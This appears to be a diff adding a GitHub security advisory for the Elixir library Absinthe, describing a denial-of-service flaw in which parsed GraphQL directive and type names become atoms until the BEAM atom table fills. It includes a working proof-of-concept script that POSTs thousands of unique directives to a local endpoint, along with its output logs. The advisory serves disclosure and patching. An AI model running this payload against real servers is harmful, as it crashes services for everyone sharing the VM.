@@ -1,0 +1,159 @@
+---
+description: |-
+  ### Summary
+  When Absinthe parses a GraphQL SDL document, every `directive @<name>` definition is converted into a freshly created atom without any allow-list or length cap. Because atoms are never garbage-collected and the BEAM has a hard ~1,048,576 atom-table limit, any application that feeds attacker-controlled SDL through Absinthe's parser can be crashed (whole VM termination) by submitting a document containing enough unique directive names.
+  
+  Introduced in https://github.com/absinthe-graphql/absinthe/commit/d0eae7764520d4e8e5dfff619068c0de911aec33
+  
+  ### Details
+  In `lib/absinthe/language/directive_definition.ex:27`, the `Blueprint.from_ast/2` conversion does:
+  
+  ```elixir
+  Macro.underscore(node.name) |> String.to_atom()
+  ```
+  
+  `node.name` is taken verbatim from the parsed GraphQL document, so the atom is created before the directive has been validated against any known schema. There is no use of `String.to_existing_atom/1`, no length cap, and no allow-list. Each unique directive name in the input permanently consumes one slot in the global atom table.
+  
+  Any code path that runs `Absinthe.Phase.Parse` (or any equivalent that ultimately calls `Absinthe.Blueprint.Draft.convert/2` on a parsed `DirectiveDefinition` node) on untrusted text is exposed — for example, a schema-upload endpoint, a federation gateway that ingests remote SDL, an introspection-to-SDL converter, or any developer tool that runs the parser over user-supplied documents. An attacker only needs to submit one (or a handful of) SDL documents that together contain ~1M unique `directive @<random>` definitions to exhaust the atom table and crash the BEAM.
+  
+  The same vulnerablity was found in these files as well:
+  
+  - `lib/absinthe/language/enum_type_definition.ex:23`
+  - `lib/absinthe/language/field_definition.ex:27`
+  - `lib/absinthe/language/input_object_type_definition.ex:24`
+  - `lib/absinthe/language/input_value_definition.ex:31`
+  - `lib/absinthe/language/interface_type_definition.ex:26`
+  - `lib/absinthe/language/object_type_definition.ex:27`
+  - `lib/absinthe/language/scalar_type_definition.ex:23`
+  - `lib/absinthe/language/union_type_definition.ex:24`
+  - maybe others too.
+  
+  Please do a search&replace in the whole project.
+  
+  ### PoC
+  A script that parses a generated SDL document containing many unique `directive @<random>` definitions through Absinthe and demonstrates unbounded atom-table growth (eventually crashing the VM) is attached at the end of this report.
+  
+  ### Impact
+  This is an unauthenticated denial-of-service vulnerability (atom-table exhaustion leading to BEAM VM crash) affecting any application that passes untrusted GraphQL SDL through Absinthe's parser. The crash takes down the entire Erlang node, not just the request handler, so all unrelated workloads sharing the VM are also impacted. The only precondition is that attacker-controlled text reaches the SDL parser; no authentication, schema privileges, or query execution are required.
+  
+  ## Scripts and Logs
+  
+  ```elixir
+  # Verifies: Unbounded atom creation from parsed directive name
+  
+  Mix.install([
+    {:absinthe, "~> 1.7"},
+    {:absinthe_plug, "~> 1.5"},
+    {:bandit, "~> 1.5"},
+    {:plug, "~> 1.16"},
+    {:jason, "~> 1.4"},
+    {:req, "~> 0.5"}
+  ])
+  
+  # Minimal Absinthe schema -- the only thing it needs to do is exist
+  # so that Absinthe.Plug will parse incoming GraphQL documents.
+  defmodule DemoSchema do
+    use Absinthe.Schema
+  
+    query do
+      field :hello, :string do
+        resolve fn _, _, _ -> {:ok, "world"} end
+      end
+    end
+  end
+  
+  # Standard absinthe_plug HTTP entry point. This is the public
+  # trust boundary: anyone who can reach the server can POST a
+  # GraphQL document, which Absinthe will parse and lower into a
+  # Blueprint -- the path that mints atoms from directive names.
+  defmodule Router do
+    use Plug.Router
+  
+    plug Plug.Parsers,
+      parsers: [:urlencoded, :multipart, :json, Absinthe.Plug.Parser],
+      pass: ["*/*"],
+      json_decoder: Jason
+  
+    plug :match
+    plug :dispatch
+  
+    forward "/graphql", to: Absinthe.Plug, init_opts: [schema: DemoSchema]
+  
+    match _ do
+      send_resp(conn, 404, "not found")
+    end
+  end
+  
+  port = 41_731
+  {:ok, server_pid} = Bandit.start_link(plug: Router, port: port, startup_log: false)
+  
+  base = "http://127.0.0.1:#{port}/graphql"
+  
+  # Attacker-controlled GraphQL document: a flood of unique directive
+  # definitions plus a trivial operation. Absinthe parses the whole
+  # document and converts each DirectiveDefinition AST node into a
+  # Blueprint, calling String.to_atom/1 on every directive name along
+  # the way (lib/absinthe/language/directive_definition.ex:27).
+  n = 5_000
+  random_tag = :crypto.strong_rand_bytes(4) |> Base.encode16(case: :lower)
+  
+  directives =
+    1..n
+    |> Enum.map_join("\n", fn i ->
+      "directive @atomdos_#{random_tag}_#{i} on FIELD"
+    end)
+  
+  document = directives <> "\nquery { hello }\n"
+  
+  before_atoms = :erlang.system_info(:atom_count)
+  
+  response =
+    Req.post!(base,
+      headers: [{"content-type", "application/graphql"}],
+      body: document,
+      receive_timeout: 60_000
+    )
+  
+  after_atoms = :erlang.system_info(:atom_count)
+  delta = after_atoms - before_atoms
+  
+  IO.puts("HTTP status:        #{response.status}")
+  IO.puts("payload directives: #{n}")
+  IO.puts("atom_count before:  #{before_atoms}")
+  IO.puts("atom_count after:   #{after_atoms}")
+  IO.puts("delta:              #{delta}")
+  
+  # Tear the listener down so the script can be re-run cleanly.
+  Process.exit(server_pid, :normal)
+  
+  result =
+    if delta >= n do
+      "VERIFIED: a single HTTP POST to /graphql minted #{delta} new atoms (>= #{n} attacker-supplied directive names); BEAM atom table (~1,048,576 cap) is exhaustible by an outside attacker via Absinthe.Plug -> Absinthe.Language.DirectiveDefinition."
+    else
+      "NOT VERIFIED: only #{delta} new atoms were created for #{n} unique directive names sent over HTTP."
+    end
+  
+  IO.puts(result)
+  ```
+  
+  
+  ### Logs
+  
+  ```logs
+  HTTP status:        200
+  payload directives: 5000
+  atom_count before:  26049
+  atom_count after:   32581
+  delta:              6532
+  VERIFIED: a single HTTP POST to /graphql minted 6532 new atoms (>= 5000 attacker-supplied directive names)
+  ```
+disclosure_date: 2026-05-14
+first_patched_versions:
+  - 1.10.2
+id: GHSA-qf4g-9fqq-mmm7
+link: https://github.com/advisories/GHSA-qf4g-9fqq-mmm7
+package: absinthe
+severity: high
+title: 'Absinthe: Unbounded atom creation from parsed directive name'
+vulnerable_version_ranges:
+  - '>= 1.5.0, < 1.10.2'
